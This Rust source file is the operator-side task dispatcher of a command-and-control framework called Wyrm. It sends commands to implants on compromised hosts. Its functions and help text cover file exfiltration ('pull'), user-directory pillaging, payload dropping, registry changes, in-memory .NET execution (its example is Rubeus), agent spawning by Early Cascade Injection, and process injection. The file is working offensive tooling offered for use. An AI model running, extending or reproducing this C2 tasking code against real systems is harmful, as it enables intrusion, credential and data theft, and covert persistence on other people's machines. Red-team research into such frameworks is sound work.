use std::{collections::HashMap, mem::take};

use chrono::{DateTime, Utc};
use leptos::prelude::{Read, RwSignal, Update, Write, use_context};
use shared::{
    task_types::{RegAddInner, RegQueryInner, RegType},
    tasks::{
        AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, InjectInner,
        WyrmResult,
    },
};
use thiserror::Error;

use crate::{
    controller::{delete_item_in_browser_store, wyrm_chat_history_browser_key},
    models::dashboard::{ActiveTabs, Agent, TabConsoleMessages},
    net::{ApiError, C2Url, IsTaskingAgent, IsTaskingAgentErr, api_request},
    tasks::{
        task_dispatch::{DispatchResult, TaskingError},
        utils::{DiscardFirst, split_string_slices_to_n, validate_reg_type},
    },
};

#[derive(Debug, Error)]
pub enum TaskDispatchError {
    #[error("API Error {0}.")]
    Api(#[from] ApiError),
    #[error("Bad tokens in input {0}")]
    BadTokens(String),
    #[error("Agent ID not present in task dispatch")]
    AgentIdMissing(#[from] IsTaskingAgentErr),
    #[error("Failed to serialise/deserialise data. {0}")]
    DeserialisationError(#[from] serde_json::Error),
}

pub async fn list_processes(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(
            AdminCommand::ListProcesses,
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn change_directory(new_dir: &[&str], agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    let new_dir = new_dir.join(" ").trim().to_string();

    Ok(Some(
        api_request(
            AdminCommand::Cd(new_dir),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn kill_agent(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    let _ = api_request(AdminCommand::KillAgent, agent, None, C2Url::Standard, None).await?;
    let tabs: RwSignal<ActiveTabs> =
        use_context().expect("could not get tabs context in kill_agent()");

    // Remove the tab from the GUI - doing so will autosave the chat
    if let IsTaskingAgent::Yes(agent_id) = agent {
        tabs.update(|t| t.remove_tab(agent_id));
    }

    Ok(None)
}

pub async fn kill_process(agent: &IsTaskingAgent, pid: &&str) -> DispatchResult {
    agent.has_agent_id()?;

    // Validate, even through we pass a String - check it client side
    let pid_as_int: i32 = pid.parse().unwrap_or(0);
    if pid.is_empty() || pid_as_int == 0 {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens("No pid or non-numeric supplied.".into()),
        ));
    }

    Ok(Some(
        api_request(
            AdminCommand::KillProcessById(pid.to_string()),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn copy_file(raw_input: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in copy_file.".into()),
            ));
        }
    };

    Ok(Some(
        api_request(
            AdminCommand::Copy((from, to)),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn move_file(raw_input: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;
    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
            ));
        }
    };

    Ok(Some(
        api_request(
            AdminCommand::Move((from.to_string(), to.to_string())),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

#[derive(Copy, Clone)]
pub enum FileOperationTarget {
    Dir,
    File,
}

pub async fn remove_file(
    raw_input: String,
    target: FileOperationTarget,

    agent: &IsTaskingAgent,
) -> DispatchResult {
    agent.has_agent_id()?;
    let target_path = match split_string_slices_to_n(1, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
            ));
        }
    };

    let result = match target {
        FileOperationTarget::Dir => {
            api_request(
                AdminCommand::RmDir(target_path),
                agent,
                None,
                C2Url::Standard,
                None,
            )
            .await?
        }
        FileOperationTarget::File => {
            api_request(
                AdminCommand::RmFile(target_path),
                agent,
                None,
                C2Url::Standard,
                None,
            )
            .await?
        }
    };

    Ok(Some(result))
}

/// Pull a single file from the target machine
pub async fn pull_file(target: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    if target.is_empty() {
        leptos::logging::error!("Pull command failed - Please specify a target file");
    }

    let target = match split_string_slices_to_n(1, &target, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in pull_file.".into()),
            ));
        }
    };

    Ok(Some(
        api_request(
            AdminCommand::Pull(target.to_string()),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn remove_agent(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;
    let _ = api_request(
        AdminCommand::RemoveAgentFromList,
        agent,
        None,
        C2Url::Standard,
        None,
    )
    .await?;

    // Remove agent from connected_agents
    let tabs: RwSignal<ActiveTabs> =
        use_context().expect("could not get tabs context in kill_agent()");

    if let IsTaskingAgent::Yes(agent_id) = agent {
        tabs.update(|t| t.remove_tab(agent_id));
    }

    Ok(None)
}

pub fn unknown_command() -> DispatchResult {
    leptos::logging::log!(
        "Unknown command or you did not supply the correct number of arguments. Type \"help (command)\" \
        to see the instructions for that command.",
    );

    Err(
        TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens(
                "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
            to see the instructions for that command.".into()
            )
        )
    )
}

pub async fn set_sleep(sleep_time: &str, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    let sleep_time: i64 = match sleep_time.parse() {
        Ok(s) => s,
        Err(e) => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens(format!("Could not parse new sleep time. {e}")),
            ));
        }
    };

    // As on the C2 we need the sleep time to be an i64, but the implant needs it to be a u64,
    // we want to make sure we aren't going to get any overflow behaviour which could lead to
    // denial of service or other errors. We check the input number is not less than or = to 0.
    // We do not need to check the upper bound because an i64 MAX will fit into a u64.
    if sleep_time <= 0 {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens("Sleep time must be greater than 1 (second)".into()),
        ));
    }

    Ok(Some(
        api_request(
            AdminCommand::Sleep(sleep_time),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

/// Clears the terminal of the selected tab / agent for the operator. This does not clear the database.
pub async fn clear_terminal(agent: &IsTaskingAgent) -> DispatchResult {
    if let IsTaskingAgent::Yes(agent_id) = agent {
        let connected_agents: RwSignal<HashMap<String, RwSignal<Agent>>> =
            use_context().expect("could not get RwSig connected_agents");

        let mut lock = connected_agents.write();

        if let Some(agent) = (*lock).get_mut(agent_id) {
            // Clear the chat from browser store
            let tabs: RwSignal<ActiveTabs> =
                use_context().expect("could not get tabs context in CommandInput()");
            let lock = tabs.read();
            let name = lock.active_id.as_ref().unwrap();
            delete_item_in_browser_store(&wyrm_chat_history_browser_key(name));
            // Clear chat from in memory representation
            agent.update(|a| a.output_messages.clear());
        } else {
            leptos::logging::log!("Agent ID: {agent_id} not found when trying to clear console.");
        }
    }

    Ok(None)
}

pub async fn pwd(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(AdminCommand::Pwd, agent, None, C2Url::Standard, None).await?,
    ))
}

pub async fn export_db(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(AdminCommand::ExportDb, agent, None, C2Url::Standard, None).await?,
    ))
}

pub async fn dir_listing(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(AdminCommand::Ls, agent, None, C2Url::Standard, None).await?,
    ))
}

pub async fn show_server_time() -> DispatchResult {
    let result = api_request(
        AdminCommand::ShowServerTime,
        &IsTaskingAgent::No,
        None,
        C2Url::Standard,
        None,
    )
    .await?;

    let deserialised_response: DateTime<Utc> = serde_json::from_slice(&result)?;

    let connected_agents: RwSignal<HashMap<String, RwSignal<Agent>>> =
        use_context().expect("could not get RwSig connected_agents");
    let mut lock = connected_agents.write();

    if let Some(agent) = (*lock).get_mut("Server") {
        agent.update(|guard| {
            guard
                .output_messages
                .push(TabConsoleMessages::non_agent_message(
                    "ServerTime".into(),
                    deserialised_response.to_string(),
                ))
        });
    }

    Ok(None)
}

pub async fn pillage(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(
            AdminCommand::ListUsersDirs,
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

/// Show the help menu to the user
pub async fn show_help(agent: &IsTaskingAgent) -> DispatchResult {
    let messages: Vec<String> = vec![
        "help <command>".into(),
        "exit (Exit's the client)".into(),
        "servertime (Shows the local time of the server)".into(),
        "kill_agent | ka (terminates the agent on the endpoint)".into(),
        "remove_agent | ra (removes the agent from the interface; until it reconnects)".into(),
        "cls | clear (clears the terminal)".into(),
        "".into(),
        "export_db (will export the database to /data/exports/{agent_id})".into(),
        "set sleep [time SECONDS]".into(),
        "ps".into(),
        "cd <relative path | absolute path>".into(),
        "pwd".into(),
        "ls".into(),
        "cp <from> <to> | copy <from> <to> (accepts relative or absolute paths)".into(),
        "mv <from> <to> | move <from> <to> (accepts relative or absolute paths)".into(),
        "rm <path to file> (removes file [this command cannot remove a directory] - accepts relative or absolute paths)".into(),
        "rm_d <path to dir> (removes directory - accepts relative or absolute paths)".into(),
        "pull <path> (Exfiltrates a file to the C2. For more info, type help pull.)".into(),
        "pillage".into(),
        "run".into(),
        "kill <pid>".into(),
        "drop <server recognised name> <filename to drop on disk (including extension)>".into(),
        "reg query <path_to_key>".into(),
        "reg query <path_to_key> <value> (for more info, type help reg)".into(),
        "reg add <path_to_key> <value name> <value data> <data type> (for more info, type help reg)".into(),
        "reg del <path_to_key> <Optional: value name> (for more info, type help reg)".into(),
        "dotex <bin> <args> (execute a dotnet binary in memory in the implant, for more info type help dotex)".into(),
        "whoami (natively, without powershell/cmd, retrieves your SID, domain\\username and token privileges".into(),
        "spawn <staged name> (spawns a new Wyrm agent through Early Cascade Injection)".into(),
        "wof <function name> (run's a Wyrm Object File [statically linked only right now] on the agent's main thread)".into(),
    ];

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let connected_agents: RwSignal<HashMap<String, RwSignal<Agent>>> =
            use_context().expect("could not get RwSig connected_agents");
        let mut lock = connected_agents.write();

        if let Some(agent) = (*lock).get_mut(agent_id) {
            agent.update(|guard| {
                guard.output_messages.push(TabConsoleMessages {
                    completed_id: 0,
                    event: "HelpMenu".into(),
                    time: "-".into(),
                    messages,
                })
            });
        }
    }

    Ok(None)
}

/// Shows help for a specified command where further details are available
pub async fn show_help_for_command(agent: &IsTaskingAgent, command: &str) -> DispatchResult {
    let messages: Vec<String> = match command {
        "drop" => vec![
            "Drops a file to disk. The file dropped must be staged on the C2 first, otherwise the process will not complete.".into(),
            "This command will drop the payload into the CURRENT working directory of the agent.".into(),
            "Arg1: The colloquial server name for the file you are dropping (appears in the Staged Resources panel as the 'Name' column)".into(),
            "Arg2: The destination filename of what you want to drop, if you want this file to have an extension, you must included that.".into(),
            "          For example, if dropping a DLL staged as my_dll, you may wish to do: drop my_dll version.dll, which will save the DLL as version.dll on disk.".into(),
        ],
        "pull" => vec![
            "Usage: pull <file path>".into(),
            "Exfiltrates a file to the C2 by its file path, which can be relative or absolute. This will upload the file to the".into(),
            "C2 and save it under: c2/<target hostname>/<file path as per targets full path>.".into(),
            "If a file already exists at that location, it will be overwritten. Note, using `pull` will cause the file to be uploaded as a buffered stream".into(),
            "meaning you can exfiltrate files of any size without causing the device to go out of memory.".into(),
        ],
        "reg query" => vec![
            "Usage: reg query <path_to_key> <OPTIONAL: value>".into(),
            "Queries the registry by a path to the key, with an optional value if you wish to query only a specific value".into(),
            "If the path contains whitespace, ensure you wrap it in \"quotes\".".into(),
        ],
        "reg" => vec![
            "reg query".into(),
            "Usage: reg query <path_to_key> <OPTIONAL: value>".into(),
            "Queries the registry by a path to the key, with an optional value if you wish to query only a specific value".into(),
            "If the path contains whitespace, ensure you wrap it in \"quotes\".".into(),
            "".into(),
            "".into(),
            "reg add".into(),
            "Usage: reg add <path_to_key> <value name> <value data> <data type>".into(),
            "Modifies the registry by either adding a new key if it did not already exist, or updating an existing key.".into(),
            "For the data type, you should specify either: string, DWORD, or QWORD depending on the data you are writing.".into(),
            "You can then check the addition by running reg query <args>.".into(),
            "".into(),
            "".into(),
            "reg del".into(),
            "Usage: reg del <path_to_key> <Optional: value name>".into(),
            "Deletes a registry key, or value, based on above args. Deleting the key will delete all sub-keys under it, so take care.".into(),
        ],
        "dotex" => vec![
            "dotex <binary> <args>".into(),
            "Executes a dotnet binary in memory within the implant, without having it drop to disk! currently, this only executes within the implants".into(),
            "process, meaning if you run a never ending dotnet binary, you will (probably) lose that beacon.".into(),
            "".into(),
            "To stage a dotnet binary, where the C2 is installed (outside of docker) you will find a folder in the Wyrm root called c2_transfer.".into(),
            "Simply drag a file into this directory and it will be auto-copied into the C2 without needing a restart. Whatever you call".into(),
            "that binary, you can then invoke it with dotex. For example, if you drop Rubeus.exe into c2_transfer, you can run Rubeus in the".into(),
            "agent via: dotex Rubeus.exe klist.".into(),
            "".into(),
            "The results of the execution will then be shown in your output terminal in the GUI.".into(),
        ],
        _ => vec!["No help pages available for this command, or it does not exist.".into()],
    };

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let connected_agents: RwSignal<HashMap<String, RwSignal<Agent>>> =
            use_context().expect("could not get RwSig connected_agents");
        let mut lock = connected_agents.write();

        if let Some(agent) = (*lock).get_mut(agent_id) {
            agent.update(|guard| {
                guard.output_messages.push(TabConsoleMessages {
                    completed_id: 0,
                    event: "HelpMenu".into(),
                    time: "-".into(),
                    messages,
                })
            });
        }
    }

    Ok(None)
}

pub async fn run_powershell_command(args: &[&str], agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    let mut args_string: String = String::new();
    for arg in args {
        args_string += arg;
        args_string += " ";
    }

    let args_trimmed = args_string.trim().to_string();

    Ok(Some(
        api_request(
            AdminCommand::Run(args_trimmed),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

/// Instructs the agent to drop a staged file onto disk on the target endpoint.
pub async fn file_dropper(args: &[&str], agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    if args.len() != 2 {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens(
                "Invalid number of args passed into the `drop` command.".into(),
            ),
        ));
    }

    if args[0].contains(DELIM_FILE_DROP_METADATA) || args[1].contains(DELIM_FILE_DROP_METADATA) {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens("Input cannot contain a comma.".into()),
        ));
    }

    let file_data = FileDropMetadata {
        internal_name: args[0].to_string(),
        download_name: args[1].to_string(),
        // This is computed on the C2
        download_uri: None,
    };

    let response = api_request(
        AdminCommand::Drop(file_data),
        agent,
        None,
        C2Url::Standard,
        None,
    )
    .await?;

    let result = serde_json::from_slice::<WyrmResult<String>>(&response)
        .expect("could not deser response from Drop");

    if let WyrmResult::Err(e) = result {
        if let IsTaskingAgent::Yes(agent_id) = agent {
            let connected_agents: RwSignal<HashMap<String, RwSignal<Agent>>> =
                use_context().expect("could not get RwSig connected_agents");
            let mut lock = connected_agents.write();

            if let Some(agent) = (*lock).get_mut(agent_id) {
                agent.update(|a| {
                    a.output_messages
                        .push(TabConsoleMessages::non_agent_message("[Drop]".into(), e))
                });
            }
        }
    }

    Ok(None)
}

pub enum RegOperationDelQuery {
    Query,
    Delete,
}

/// Queries or deletes a registry key.
///
/// Arg for [`RegOperationDelQuery`] specifies the tasking.
pub async fn reg_query_del(
    inputs: String,

    agent: &IsTaskingAgent,
    operation: RegOperationDelQuery,
) -> DispatchResult {
    agent.has_agent_id()?;

    if inputs.is_empty() {
        leptos::logging::log!("Please specify options.");
    }

    //
    // We have a max of 2 values we can get from this task. The first is specifying a key and value,
    // second is just the key.
    //
    // The strategy here is to try resolve 2 strings in the input, if that fails, we try 1 string, then we have
    // the proper options
    //

    let reg_query_options = split_string_slices_to_n(2, &inputs, DiscardFirst::ChopTwo);
    let mut reg_query_options = if reg_query_options.is_none() {
        match split_string_slices_to_n(1, &inputs, DiscardFirst::ChopTwo) {
            Some(s) => s,
            None => {
                return Err(TaskingError::TaskDispatchError(
                    TaskDispatchError::BadTokens("Could not find options for command".into()),
                ));
            }
        }
    } else {
        reg_query_options.unwrap()
    };

    let query_data: RegQueryInner = if reg_query_options.len() == 2 {
        (
            take(&mut reg_query_options[0]),
            Some(take(&mut reg_query_options[1])),
        )
    } else {
        (take(&mut reg_query_options[0]), None)
    };

    let result = match operation {
        RegOperationDelQuery::Query => {
            api_request(
                AdminCommand::RegQuery(query_data),
                agent,
                None,
                C2Url::Standard,
                None,
            )
            .await?
        }
        RegOperationDelQuery::Delete => {
            api_request(
                AdminCommand::RegDelete(query_data),
                agent,
                None,
                C2Url::Standard,
                None,
            )
            .await?
        }
    };

    Ok(Some(result))
}

/// Queries a registry key
pub async fn reg_add(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    if inputs.is_empty() {
        leptos::logging::log!("Please specify options.");
    }

    //
    // We have a max of 2 values we can get from this task. The first is specifying a key and value,
    // second is just the key.
    //
    // The strategy here is to try resolve 2 strings in the input, if that fails, we try 1 string, then we have
    // the proper options
    //

    let mut reg_add_options = split_string_slices_to_n(4, &inputs, DiscardFirst::ChopTwo)
        .ok_or_else(|| {
            TaskingError::TaskDispatchError(TaskDispatchError::BadTokens(
                "Could not find options for command".into(),
            ))
        })?;

    let reg_type = match reg_add_options[3].as_str() {
        "string" | "String" => RegType::String,
        "u32" | "U32" | "dword" | "DWORD" => RegType::U32,
        "u64" | "U64" | "qword" | "QWORD" => RegType::U64,
        _ => {
            return Err(TaskingError::TaskDispatchError(TaskDispatchError::BadTokens(
                "Could not extrapolate type, the final param should be either string, dword, or qword depending on the data type".into(),
            )));
        }
    };

    // Validate input before we get to the implant..
    if validate_reg_type(reg_add_options[2].as_str(), reg_type).is_err() {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens(format!(
                "Could not parse value for the type specified. Tried parsing {} as {}",
                reg_add_options[2], reg_add_options[3],
            )),
        ));
    };

    let query_data: RegAddInner = (
        take(&mut reg_add_options[0]),
        take(&mut reg_add_options[1]),
        take(&mut reg_add_options[2]),
        reg_type,
    );

    Ok(Some(
        api_request(
            AdminCommand::RegAdd(query_data),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn dotex(inputs: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    if inputs.is_empty() {
        leptos::logging::log!("Please specify options.");
    }

    let slices = split_string_slices_to_n(0, &inputs, DiscardFirst::Chop).ok_or_else(|| {
        TaskingError::TaskDispatchError(TaskDispatchError::BadTokens(
            "Could not find options for command".into(),
        ))
    })?;

    if slices.is_empty() {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens("Options were empty. Cannot continue.".into()),
        ));
    }

    let tool = slices[0].clone();
    let args = slices[1..].to_vec();

    let inner = DotExInner::from(tool, args);

    Ok(Some(
        api_request(
            AdminCommand::DotEx(inner),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn whoami(agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;

    Ok(Some(
        api_request(AdminCommand::WhoAmI, agent, None, C2Url::Standard, None).await?,
    ))
}

pub async fn spawn(raw_input: String, agent: &IsTaskingAgent) -> DispatchResult {
    agent.has_agent_id()?;
    let target_path = match split_string_slices_to_n(1, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
            ));
        }
    };

    Ok(Some(
        api_request(
            AdminCommand::Spawn(target_path),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn run_static_wof(agent: &IsTaskingAgent, raw_input: String) -> DispatchResult {
    agent.has_agent_id()?;

    let mut builder = vec![];
    let args = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            builder.push(take(&mut inner[0]));

            let mut args = take(&mut inner[1]);
            args.push('\0'); // add a null byte on for C compat
            builder.push(args);
            Some(builder)
        }
        None => match split_string_slices_to_n(1, &raw_input, DiscardFirst::Chop) {
            Some(mut s) => {
                builder.push(take(&mut s[0]));
                Some(builder)
            }
            None => None,
        },
    };

    let ser = match serde_json::to_string(&args) {
        Ok(s) => s,
        Err(e) => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::DeserialisationError(e),
            ));
        }
    };

    Ok(Some(
        api_request(
            AdminCommand::StaticWof(ser),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}

pub async fn inject(agent: &IsTaskingAgent, raw_input: String) -> DispatchResult {
    agent.has_agent_id()?;

    let (payload, pid_as_string) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop)
    {
        Some(mut inner) => (take(&mut inner[0]), (take(&mut inner[1]))),
        None => {
            return Err(TaskingError::TaskDispatchError(
                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
            ));
        }
    };

    let Ok(pid) = pid_as_string.parse::<u32>() else {
        return Err(TaskingError::TaskDispatchError(
            TaskDispatchError::BadTokens(format!(
                "Could not parse PID to a u32. Got: {pid_as_string}"
            )),
        ));
    };

    let inner = InjectInner { payload, pid };

    Ok(Some(
        api_request(
            AdminCommand::Inject(inner),
            agent,
            None,
            C2Url::Standard,
            None,
        )
        .await?,
    ))
}
